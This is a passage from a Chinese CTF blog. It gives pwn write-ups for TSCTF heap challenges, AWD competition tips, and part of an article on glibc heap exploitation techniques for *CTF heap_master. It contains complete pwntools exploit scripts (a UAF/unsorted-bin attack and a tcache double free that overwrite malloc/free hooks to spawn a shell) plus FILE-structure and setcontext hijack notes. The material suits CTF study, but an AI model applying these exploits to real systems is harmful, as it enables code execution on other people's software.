characters (not including the trailing ’\0’) which would have been written to the final string if enough space had been available. Thus, a return value of size or more means that the output was truncated. 如果输出因为size的限制而被截断，返回值将是“如果有足够空间存储，所应能输出的字符数(不包括字符串结尾的’\0’)”，这个值和size相等或者比size大！也就是说，如果可以写入的字符串是”0123456789ABCDEF”共16位，但是size限制了是10，这样 snprintf() 的返回值将会是16 而不是10 UAF，这个都看得出来。 遇到的困难和需要思考的地方： 困难一：因为在my_malloc时对我们分配的chunk的地址进行了检查，导致我们无法正常地分配chunk到main_arena-0x33去。 解决方法：利用溢出进行unsortedbin_attack将far全局变量改为main_arena+88，从而突破原先的限制。 困难二：因为进行了unsortedbin_attack之后，unsortedbin就已经毁坏无法使用，所以我们之后的malloc都必须从fastbin里取，每次newfile时都要申请0x50chunk的操作很干扰我们的进一步行动。 解决办法：因为没有限制file的数量，所以我们可以无限申请file，在进行unsortedbin_attack之前，我们先多次newfile，再多次delete，使0x50的fastbin里留存有大量充足的chunk，使之后的newfile申请的0x50的结构体chunk都直接从这里取，再使0x70的fastbin里提前实现好double free，在unsortedbin_attack之后就可以一气呵成getshell。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#coding:utf-8from pwn import *path = './filesystem'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new_dir(name): p.recvuntil('Your choice: \n') p.sendline('1') p.recvuntil('Give me the directory name: \n') p.sendline(name)def new_fileN(dir_name,file_name,file_size,content, is_changed='n'): p.recvuntil('Your choice: \n') p.sendline('2') p.recvuntil('which directory do you want to put this file in: \n') p.sendline(dir_name) p.recvuntil('Ok, plz input your filename(len&lt;=0x20): \n') p.sendline(file_name) p.recvuntil('file size: \n') p.sendline(str(file_size)) p.recvuntil('changed!!\n') p.sendline(is_changed) p.recvuntil('Content: \n') p.sendline(content)def new_fileY(dir_name,file_name,file_size,new_file_name,content, is_changed='Y'): p.recvuntil('Your choice: \n') p.sendline('2') p.recvuntil('which directory do you want to put this file in: \n') p.sendline(dir_name) p.recvuntil('Ok, plz input your filename(len&lt;=0x20): \n') p.send(file_name) p.recvuntil('file size: \n') p.sendline(str(file_size)) p.recvuntil('changed!!\n') p.sendline(is_changed) p.recvuntil('input your new file name: ') p.send(new_file_name) p.recvuntil('Content: \n') p.sendline(content)def show(dir_name,file_name): p.recvuntil('Your choice: \n') p.sendline('3') p.recvuntil('input directory: \n') p.sendline(dir_name) p.recvuntil('input filename: \n') p.sendline(file_name)def delete(dir_name,file_name): p.recvuntil('Your choice: \n') p.sendline('4') p.recvuntil('input directory: \n') p.sendline(dir_name) p.recvuntil('input filename: \n') p.sendline(file_name)def recover(dir_name,file_name): p.recvuntil('Your choice: \n') p.sendline('6') p.recvuntil('input directory: \n') p.sendline(dir_name) p.recvuntil('input filename: \n') p.sendline(file_name)new_dir('xxrw')new_fileN('xxrw','xqh0',0x80,'\x00'*0x80)new_fileN('xxrw','xqh1',0x40,'\x00'*0x40)delete('xxrw','xqh0')recover('xxrw','xqh0')show('xxrw','xqh0')p.recvuntil('file content: ')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f72e73ebb78-0x7f72e7027000)log.success('libcbase = '+hex(libcbase))new_fileN('xxrw','xqh',0x30,'\x00'*0x30)new_fileN('xxrw','xqh2',0x40,'\x00'*0x40)new_fileN('xxrw','xqh3',0x40,'\x00'*0x40)new_fileN('xxrw','xqh4',0x40,'\x00'*0x40)new_fileN('xxrw','xqh5',0x40,'\x00'*0x40)new_fileN('xxrw','xqh6',0x40,'\x00'*0x40)new_fileN('xxrw','xqh7',0x40,'\x00'*0x40)new_fileN('xxrw','xqh8',0x40,'\x00'*0x40)new_fileN('xxrw','xqh9',0x40,'\x00'*0x40)new_fileN('xxrw','xqh10',0x40,'\x00'*0x40)delete('xxrw','xqh1')delete('xxrw','xqh2')delete('xxrw','xqh3')delete('xxrw','xqh4')delete('xxrw','xqh5')delete('xxrw','xqh6')delete('xxrw','xqh7')delete('xxrw','xqh8')delete('xxrw','xqh9')delete('xxrw','xqh10')#----------------------------prepare getshell-------------------new_fileN('xxrw','xqh_p1',0x60,'\x00'*0x60)new_fileN('xxrw','xqh_p2',0x60,'\x00'*0x60)delete('xxrw','xqh_p1')delete('xxrw','xqh_p2')recover('xxrw','xqh_p1')delete('xxrw','xqh_p1')#----------------------------------------------------------------new_fileN('xxrw','xqh11',0x9f,'\x00'*0x9f) new_fileN('xxrw','xqh12',0x30,'\x00'*0x30)delete('xxrw','xqh11')payload = '\x12'*0x10+p64(0)+p64(0x91)+p64(0)+p64(0x603068-0x10)new_fileY('xxrw','xq'*0x10,0x10,'xqh'*0x10+'\xff',payload)new_fileN('xxrw','xqh13',0x80,'\x00'*0x80)#---------------------------------success-------------------------one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]new_fileN('xxrw','xqh_p3',0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23))new_fileN('xxrw','xqh_p4',0x60,'\x00'*0x60)new_fileN('xxrw','xqh_p5',0x60,'\x00'*0x60)new_fileN('xxrw','getshell!!',0x60,'\x00'*0x13+p64(libcbase+one_gadget[2]))delete('xxrw','getshell!!')if attach == 1: gdb.attach(p)p.interactive() pwn1:环境：docker：Ubuntu19.04 唉，比较操蛋的是比赛时19.04的虚拟机崩了，学长也没有环境，所以只能在16.04上用脚本强行加载2.29的libc，还没有debug信息和符号表，让人做的很操蛋。也让我知道了docker的优越性，这道题复盘时也算是学了docker的做题环境部署。 程序分析和漏洞挖掘：程序没啥好分析的，就一个UAF的洞，是人都可以看出来，我就不贴出来了。主要分析一下利用的技巧。个人觉得这道题技巧性还是蛮高的。 看一下保护全开，心里有数了13数：肯定要改hook。 说实话，这道题开始我感觉还蛮简单的，一顿套路操作猛如虎。。。到最后发现，想用double free往malloc_hook上分chunk，new的次数超了，他限制的是20次，正常情况下要21次才能成功。 这时侯，开始想到这题肯定不是套路，还是有新东西的。以下为当时想到的逐渐接近正解的三个阶段： 申请7个chunk：从chunk1到chunk7，然后全部free，这时候再free一次chunk7，想实现chunk7又在tcache里，又在fastbin里，结果调试发现失败，tcache的检测机制还是会检测到double free。 逆向思维：我们的目标是想让一个chunk又在tcache中，又在fastbin中。既然让这个chunk先在tcache，后在fastbin中行不通的话，那我们就让他先在fastbin中，后在tcache中：申请8个chunk：从chunk1到chunk7，然后全部free，这时候再freechunk8，再new一个，再次freechunk8，这时，chunk8实现了我们的目标。 本以为可以之后就可以直接分到main_arena-0x33上去然后直接拿shell，结果后来调试发现当把fastbin里剩余的chunk链放入tcache里时，因为过不了__int_malloc里的某个检测而失败。。。思路陷入死胡同。。。 12345678910111213141516#----------------第一种--------------------------for i in range(7): new(0x60)for i in range(7): delete(i+1)delete(7) #----------------失败----------------------------#----------------第二种--------------------------for i in range(8): new(0x60)for i in range(7): delete(i+1)delete(8)new(0x60)delete(8)#----------------成功--------------------------- 最后学长想到了另外一个点：tcache里分配chunk和fastbin不同，其不检查size，fastbin因为要检查size所以必须分到main_arena-0x33，但是tcache就可以直接分到__free_hook-0x10，然后就顺利getshell！！！ exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#coding:utf-8from pwn import *path = './easyheap'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64')context.terminal = ['tmux','splitw','-h']#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('&gt;&gt;') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('content:') p.sendline(content)def delete(index): p.recvuntil('&gt;&gt;') p.sendline('2') p.recvuntil('idx:') p.sendline(str(index))def view(index): p.recvuntil('&gt;&gt;') p.sendline('3') p.recvuntil('idx:') p.sendline(str(index))new(0x500,'\x00') #0new(0x60,'\x11') #1delete(0)view(0)libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fe5df606ca0-0x7fe5df422000)log.success('libcbase = '+hex(libcbase))new(0x60,'\x22') #2new(0x60,'\x33') #3new(0x60,'\x44') #4new(0x60,'\x55') #5new(0x60,'\x66') #6new(0x60,'\x77') #7new(0x60,'\x88') #8for i in range(7): delete(i+1)delete(8)new(0x60,'\x10') #9delete(8)target = libcbase + libc.sym['__free_hook'] - 0x10new(0x60,p64(target)) #10new(0x60,'a') #11new(0x60,'b') #12new(0x60,'c')new(0x60,'d')new(0x60,'e')new(0x60,'/bin/sh\x00') #16if attach == 1: gdb.attach(p)new(0x60,'\x00'*0x10) #17one_gadget = [0xe237f,0xe2383,0xe2386,0x106ef8]new(0x60,p64(libcbase+libc.sym['system']))delete(16)p.interactive() tcache的小心得： 不检查size是其和fastbin的很大区别之一，导致其可以直接上到free_hook。 可以直接overlapping，就是一个chunk可以又在0x60的tcachebin里，又可以在0x70的tcachebin里，fastbin也可以。 当fastbin中有chunk，tcache里为空时，申请一个chunk之后，剩下的fastbin里的chunk都会放到tcache里，但貌似如果fd存在非法地址放入fastbin时会报错。 awd的一点点心得经验（pwn方面）：个人心得：首先我jio得攻要比守重要的多，为什么这么说呢，有两个原因： 大家可以算一下，假设全场有20支队伍，你pwn了一题，就可以打全场，假设拿了flag得10分，就等于每五分钟就可以得190分，即使有的队伍打patch成功了，或者总分是和不变机制，那一轮也至少能拿100+的分数，再想想我们如果去打patch，假设我们幸运的成功了，那这一题对我们的意义也就仅仅在于每一轮会少个十分二十分，但并不会妨碍做出来这题的队伍每轮得到100+的分数（除非这道题全场都做出来了。。。。），我们出一道题所得的分要比打patch少扣的分要多得多，就相当于你做出一题，而你其他所有题都在被别人打，你的分数也可以维持不降。 pwn的打patch程序极其复杂，而且不同的比赛他的check严密程度和个性化要求都不一样（我感觉碰到check难一点的patch不比写exp简单。。。），我打TSCTF时，打了三个patch，一个off-one-null，两个uaf，最后两个没防住，一个没过check（filesystem我当时打了uaf，但是他有要求说patch只能打在eh_frame段，其他任何段都不能动一个字节，后来问了ym学长他说常规打法虽然是打在eh_frame段，但实际上其他段的某些部位的字节会变。。这个还有待研究。。），但时间已经没有多少了，根本不够再去写exp，最后就是眼睁睁地看着自己一直被打而无可奈何。。。 感觉awd中pwn如果只有一个人负责真的太累了，一个人的话只能负责到一个面，又攻又守的感觉难度太大，除非是老赛棍orz，如果真的一个人去打的时候，最好目标明确果断一点，不要看了一会题，写了一会exp，又去patch一会。。。 至于怎么打patch的话，ym学长和panda学长的博客写的很清晰明了：传送门1号，传送门2号 还有就是线下赛的特点一般是题目代码量极大，会在寻找漏洞点和逆向上出为难大家的点，所以千万不能急，要沉下心慢慢找洞，不要老是看得分榜，专注一点。 比赛时需要注意的细节： 改服务器密码 打好patch别忘给权限 要留意有没有后门，因为pwn和web不一样，写exp是一个阶段性的工作，所以pwn很难开局就打起来，一般是过了一两个小时才有队伍陆陆续续写出exp然后开始打，所以主办方有可能为了防止pwn选手开局就陷入沉闷的写exp环节，有可能会在代码量极大的题中留有后门。(cxk貌似有栈溢出后门？？) 工具： winscp/Xftp xshell 自动化交flag的脚本 pwn题环境和patch工具 u盘？（合作时传文件比较快？）]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>TSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5种方法解2019*CTF_heap_master来加深对深层次堆利用手段的理解]]></title>
    <url>%2F2019%2F07%2F05%2F5%E7%A7%8D%E6%96%B9%E6%B3%95%E8%A7%A3heap_master%2F</url>
    <content type="text"><![CDATA[作为2019*CTF的倒数第二题pwn题，这道题的程序逻辑却意外的简单，这也就意味着利用起来会有不小的困难（一般程序复杂的题洞难找但利用起来不会太过刁难，程序简单的题利用起来反而困难）。 这道heap_master从名字看就知道需要对ptmalloc2的机制和堆的各种利用方法都非常熟悉才能成为heap_master而不是heap_baby。。QAQ。。。这篇文章也算是集百家之长了。。。借鉴了天枢的师傅和其他一些大师傅的wp，又查了许多资料才汇总出这一篇拙作。 一些必须知道的前置知识准备和利用手段：global_fast_max:简答的来说global_fast_max就是一个全局变量，他的作用是控制fastbinY[]的阈值，正常情况下其值为0x80，也就是大小在0x80之内的都可以放进fastbinY[]里，所以如果更改了global_max_fast的值，那fastbinY[]的范围将超标，实现fastbin_index_overflow，所以当我们free一个size极大且经过精心构造的victim_chunk时，就实现了可以几乎任意地址（在main_arena+88之后）写入victim_chunk的地址，之后比较常见的几种利用方式是： 改写_IO_list_all，伪造_IO_file_plus来劫持程序控制流。 改写stdout流，使其指向我们可控的地址，并在其上伪造一个IO_file_plus，常用来泄露libcbase。 stdin同上，但可以用来任意地址写。 stderr同上，但有更多的姿势。 改写__free_hook为system_addr，第五种方法就是利用这个。 size的计算方式为： 123fastbin_ptr = main_arena_addr + 8idx = (target_addr - fastbin_ptr) / 8 #target_addr为我们想要写入的地址。size = idx*0x10 + 0x20 #size为我们应该free的chunk的大小。 dl_open_hook:这种控制程序执行的方式是官方wp里面提到的，通过largebin attack/unsortedbina attack可以将_dl_open_hook覆盖为mmap出来的内存的地址，然后通过malloc或free报错的方式（也就是malloc_printerr），程序将会调用__libc_dlopen_mode函数，在其中会把dl_open_hook的值加载到某个寄存器，然后会call该寄存器，也就是我们获得一次劫持程序ip的机会，但是寄存器们却没法控制，需要和下面我们要讲的setcontext结合来使用才能发挥最大威力。图片来源e3pem setcontext:在pwndbg的magic功能中，我们看到有setcontext+0x35这个变量，现在终于用到了。 看一下这个玩意到底是啥： 12345678910111213141516170x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0]0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80]0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78]0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48]0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50]0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58]0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60]0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8]0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70]0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88]0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98]0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28]0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30]0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68]0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax0x7ffff7a7a5af &lt;setcontext+127&gt;: ret 我们可以看到这一段巨型gadget，几乎控制了我们所有的寄存器，只要我们可以控制rdi所指向的地址及其后0xa8的内容，就可以劫持程序执行流了。其中这几个位置比较重要： 12345678rsp = [rdi+0xa0]ret_addr = [rdi+0xa8] #push rcx; ......... ret; 开始的rcx作为缓冲区，必须装指令的地址。rdi = [rdi+0x68]rsi = [rdi+0x70]rdx = [rdi+0x88]rcx = [rdi+0x98]r8 = [rdi+0x28]r9 = [rdi+0x30] __after_morecore_hook:这玩意和setcontext+53一样，我也是在magic命令里发现了他，现在找了不少资料也没有完全搞懂他的用法，大致的用法是在sysmalloc里操作系统被要求更多内存后，调用sbrk之后使用： 1234567891011if (brk != (char *) (MORECORE_FAILURE)) //sbrk分配成功 &#123; /* Call the `morecore' hook if necessary. */ void (*hook) (void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); //&lt;------这里 &#125;else &#123; …… &#125; 如果sbrk分配成功，并且MORECORE的__after_morecore_hook函数存在，则调用这个函数。（还不清楚其原本目的是用来干嘛的）。待我啃一啃sysmalloc源码之后再来尝试利用这个破玩意，现在似乎还没出现以他为利用方式为题目。 chroot:chroot作用：chroot命令改变其当前目录，并将根目录变为指定目录，然后如果提供了命令则运行命令，也可以运行一个用户的交互式shell的副本。由chroot创造出的那个根目录，叫做“chroot监狱”（chroot jail，或chroot prison） 这道题就使用了chroot来使我们没法拿shell，只能通过orw来读取flag。 timeout 60 chroot –userspec=pwn:pwn ./ ./heap_master 这句话的意思是：运行时间不超过60s，使用pwn用户组的pwn用户，以当前文件夹为根目录，运行./heapmaster 超过60秒就kill掉进程。因为当前目录为根目录，所以我们就没办法打开shell了，因为当前目录啥都没有，没有bin，也没有sh（可执行文件），应该只有一个flag文件，还有一些其他的配置文件，所以肯定要使用orw来直接读flag。 mprotect与mmap:两个函数的man手册描述： 123456789101112131415161718192021222324252627282930NAME mprotect — set protection of memory mappingSYNOPSIS #include &lt;sys/mman.h&gt; int mprotect(void *addr, size_t len, int prot);DESCRIPTION The mprotect() function shall change the access protections to be that speci‐ fied by prot for those whole pages containing any part of the address space of the process starting at address addr and continuing for len bytes. The parame‐ ter prot determines whether read, write, execute, or some combination of accesses are permitted to the data being mapped. The prot argument should be either PROT_NONE or the bitwise-inclusive OR of one or more of PROT_READ, PROT_WRITE, and PROT_EXEC.NAME mmap — map pages of memorySYNOPSIS #include &lt;sys/mman.h&gt; void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);DESCRIPTION The mmap() function shall establish a mapping between an address space of a process and a memory object. mprotect函数用于改变某段地址的权限（rwxp） 这道题目开启了 NX 保护，因此可以考虑通过mprotect改变mmap_addr的权限，然后注入shellcode再劫持程序执行流，mprotect指定的内存区必须包含整个内存页，区间长度必须是页大小的整数倍，重点介绍如何使用mprotect。 函数原型是int mprotect(void *addr, size_t len, int prot);，addr是内存地址开头，len 是长度，prot 就是权限位，在 manpage 上有 PROT_WRITE、PROT_EXEC、PROT_READ 等几项，权限是位运算之后的数字，根据宏定义， rwx权限 就是 0x1 | 0x2 | 0x4，也就是7。 mmap用于申请一段空间，根据参数不同可以设置这段空间的权限。 mmap可以申请一段空间，但麻烦在需要控制 6 个参数，对 64 位的程序而言，也就是需要找到能控制 rdi, rsi, rdx, rcx, r8, r9 的 gadget，大部分情况是需要和setcontext+53配合使用。具体使用方法我就不赘述了。 _IO_str_jumps与_IO_list_all：_IO_file_pwn是现在最常用的pwn手段之一，因为没有程序能离开他，只要有输入输出函数和报错(malloc_printerr，exit()甚至main return)的机会，就有可能使用到_IO_file_pwn。之前也做了不少题目关于这个方面的，在这里终于有机会自己总结一下了。。。先亮出三个结构体。 12345struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; /* offset 0x68 (64bits) */ int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE //开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）&#125;;struct _IO_FILE_complete&#123; struct _IO_FILE _file;#endif //结束宏判断#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001 //依然是_IO_FILE的内容 _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf;# else void *__pad1; void *__pad2; void *__pad3; void *__pad4;# endif size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif&#125;; _IO_file的利用主要分为两种： 利用stdout和stdin文件输入输出流进行地址泄露和数据修改。 利用_IO_list_all进行程序控制流的劫持。 第一种利用方式：泄露地址的利用方法很简单，只要有办法向_IO_2_1_stdout结构体写入东西，就有机会成功，需要达成两个条件：（之后会根据题目详解两个条件） f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1 _IO_write_base!=_IO_write_ptr 任意地址写的条件比较苛刻，题目好久之前做过一道，具体都记不清了，有时间再来总结：2018_hctf_babyprintf_ver2 第二种利用方式：通过_IO_list_all劫持程序控制流。我们大家最熟悉的house of orange就是在libc2.23下诞生的在当时最新型的利用方式，网上大师傅们的分析也非常全面细致，我就不再浪费时间了，以下结构体和函数源码部分摘抄与veritas501 house_of_orange最后的劫持程序执行流部分： 我们在malloc的时候程序会出错，调用malloc_printerr函数，如下 1234if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av);c 而malloc_printerr则又调用了__libc_message。 1234567891011121314151617181920212223242526static voidmalloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)&#123; /* Avoid using this arena in future. We do not attempt to synchronize this with anything else because we minimally want to ensure that __libc_message gets its resources safely without stumbling on the current corruption. */ if (ar_ptr) set_arena_corrupt (ar_ptr); if ((action &amp; 5) == 5) __libc_message (action &amp; 2, "%s\n", str); else if (action &amp; 1) &#123; char buf[2 * sizeof (uintptr_t) + 1]; buf[sizeof (buf) - 1] = '\0'; char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0); while (cp &gt; buf) *--cp = '0'; __libc_message (action &amp; 2, "*** Error in `%s': %s: 0x%s ***\n", __libc_argv[0] ? : "&lt;unknown&gt;", str, cp); &#125; else if (action &amp; 2) abort ();&#125; 而__libc_message则又调用了abort。 1234567891011121314/* Abort with an error message. */void__libc_message (int do_abort, const char *fmt, ...)&#123;...... if (do_abort) &#123; BEFORE_ABORT (do_abort, written, fd); /* Kill the application. */ abort ();//调用abort &#125;&#125; 而abort则又调用了fflush。 123456789101112131415/* Cause an abnormal program termination with core-dump. */voidabort (void)&#123;...... /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if (stage == 1) &#123; ++stage; fflush (NULL);//调用fflush &#125; ...... 而fflush其实就是_IO_flush_all_lockp。 1#define fflush(s) _IO_flush_all_lockp (0) 而_IO_flush_all_lockp中用到了_IO_list_all，并最终通过vtable调用了_IO_OVERFLOW。 12345678910111213141516171819202122232425262728293031323334int _IO_flush_all_lockp (int do_lock)&#123;...... last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; //_IO_list_all赋给fp while (fp != NULL) &#123;...... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)//需要bypass的条件#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))//需要bypass的条件#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//改 _IO_OVERFLOW 为 system 劫持程序流！ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain;//指向下一个fp（从main_arena到heap） &#125;......&#125; 由于逻辑短路原则，想要调用后面的_IO_OVERFLOW (fp, EOF)，前面的条件必须满足，即： 1234561.fp-&gt;_mode &lt;= 02.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base或1._IO_vtable_offset (fp) == 02.fp-&gt;_mode &gt; 03.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base （主推第一种。。。） 主要想总结一下libc2.24以后的利用方法。 glibc2.24下：因为glibc2.24对vtable指针进行了检查，所以我们就不能自由改写vtable了，但是随之而来的产生了一个新的方法：利用_IO_str_jumps结构体，其和IO_jump_t一样，其成员也全部是函数指针。 123456789101112131415161718192021222324pwndbg&gt; p _IO_str_jumps $1 = &#123; __dummy = 0, __dummy2 = 0, __finish = 0x7ff39312db70 &lt;_IO_str_finish&gt;, __overflow = 0x7ff39312d850 &lt;__GI__IO_str_overflow&gt;, __underflow = 0x7ff39312d7f0 &lt;__GI__IO_str_underflow&gt;, __uflow = 0x7ff39312c370 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ff39312db50 &lt;__GI__IO_str_pbackfail&gt;, __xsputn = 0x7ff39312c3d0 &lt;__GI__IO_default_xsputn&gt;, __xsgetn = 0x7ff39312c550 &lt;__GI__IO_default_xsgetn&gt;, __seekoff = 0x7ff39312dca0 &lt;__GI__IO_str_seekoff&gt;, __seekpos = 0x7ff39312c730 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ff39312c600 &lt;_IO_default_setbuf&gt;, __sync = 0x7ff39312c9b0 &lt;_IO_default_sync&gt;, __doallocate = 0x7ff39312c7a0 &lt;__GI__IO_default_doallocate&gt;, __read = 0x7ff39312d6a0 &lt;_IO_default_read&gt;, __write = 0x7ff39312d6b0 &lt;_IO_default_write&gt;, __seek = 0x7ff39312d680 &lt;_IO_default_seek&gt;, __close = 0x7ff39312c9b0 &lt;_IO_default_sync&gt;, __stat = 0x7ff39312d690 &lt;_IO_default_stat&gt;, __showmanyc = 0x7ff39312d6c0 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ff39312d6d0 &lt;_IO_default_imbue&gt;&#125; 我们主要把目光放到两个函数上： _IO_str_overflow（_GI_IO_str_overflow）:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int _IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES)// pass return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))// should in &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ // pass return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen)//pass 一般会通过 return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);//target [fp+0xe0] if (new_buf == NULL) &#123; /* 